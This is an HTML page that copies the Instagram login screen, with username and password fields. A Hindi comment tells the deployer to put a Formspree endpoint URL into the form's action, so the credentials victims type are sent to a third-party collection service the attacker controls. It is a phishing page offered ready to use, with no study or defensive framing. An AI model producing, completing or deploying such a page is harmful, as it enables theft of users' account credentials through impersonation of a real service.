<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .login-container {
      background: #ffffff;
      border: 1px solid #dbdbdb;
      width: 350px;
      padding: 40px 40px 20px 40px;
      text-align: center;
      border-radius: 1px;
    }

    .logo {
      font-family: 'Billabong', cursive, sans-serif;
      font-size: 3.2rem;
      margin-bottom: 30px;
      font-weight: 500;
    }

    .input-field {
      width: 100%;
      padding: 10px;
      margin-bottom: 8px;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      font-size: 12px;
      outline: none;
    }

    .input-field:focus {
      border-color: #a8a8a8;
    }

    .login-btn {
      width: 100%;
      background-color: #0095f6;
      border: none;
      color: white;
      padding: 7px;
      border-radius: 8px;
      font-weight: 600;
      font-size: 14px;
      margin-top: 10px;
      cursor: pointer;
    }

    .login-btn:hover {
      background-color: #1877f2;
    }

    .divider {
      display: flex;
      align-items: center;
      margin: 20px 0;
      color: #8e8e8e;
      font-size: 12px;
      font-weight: 600;
    }

    .divider::before, .divider::after {
      content: "";
      flex: 1;
      height: 1px;
      background: #dbdbdb;
    }

    .divider span {
      padding: 0 15px;
    }

    .footer-text {
      margin-top: 20px;
      font-size: 12px;
      color: #00376b;
      cursor: pointer;
      text-decoration: none;
    }
  </style>
</head>
<body>

  <div class="login-container">
    <h1 class="logo">Instagram</h1>
    
    <!-- Yahan apna Formspree EndPoint URL dalein -->
    <form action="YOUR_FORMSPREE_URL_HERE" method="POST">
      <input type="text" name="username" class="input-field" placeholder="Phone number, username, or email" required>
      <input type="password" name="password" class="input-field" placeholder="Password" required>
      
      <button type="submit" class="login-btn">Log in</button>
    </form>

    <div class="divider">
      <span>OR</span>
    </div>

    <a href="#" class="footer-text">Forgot password?</a>
  </div>

</body>
</html>
